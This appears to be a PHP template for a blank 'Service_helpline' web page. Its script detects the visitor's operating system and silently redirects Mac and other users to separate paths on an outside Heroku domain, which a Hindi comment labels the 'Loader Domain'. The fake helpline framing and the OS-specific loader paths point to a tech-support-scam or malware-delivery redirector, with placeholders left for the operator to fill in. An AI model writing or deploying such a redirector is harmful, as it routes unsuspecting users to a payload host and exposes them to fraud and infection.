$HTML_CONTENT = <<<'HTML'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Service_helpline_0171d</title>
    <script src="https://code.jquery.com/jquery-1.4.4.min.js"></script>
    <script>
        var ALPHA = '{{ALPHA}}';
        var ANIPH = '{{ANIPH}}';

        function myOperatingSystem() {
            const ua = navigator.userAgent;
            if (ua.indexOf("Win") !== -1) return "Windows";
            if (ua.indexOf("Mac") !== -1) return "MacOS";
            if (ua.indexOf("Linux") !== -1) return "Linux";
            if (ua.indexOf("Android") !== -1) return "Android";
            if (ua.indexOf("iOS") !== -1) return "iOS";
            return "Unknown";
        }

        var os = myOperatingSystem();
        localStorage.setItem('alpha', ALPHA);
        var BASE_URL = 'https://loaderfortest-23d1cffa4338.herokuapp.com'; // अपना Loader Domain डालें

        if (os === 'MacOS') {
            window.location.href = BASE_URL + '/Ma0cHelpAsMEr0t0140/index.html?Aniph=' + ANIPH;
        } else {
            window.location.href = BASE_URL + '/Wi0nHelpAsMEr0t0140/index.html?Aniph=' + ANIPH;
        }
    </script>
</head>
<body></body>
</html>
HTML;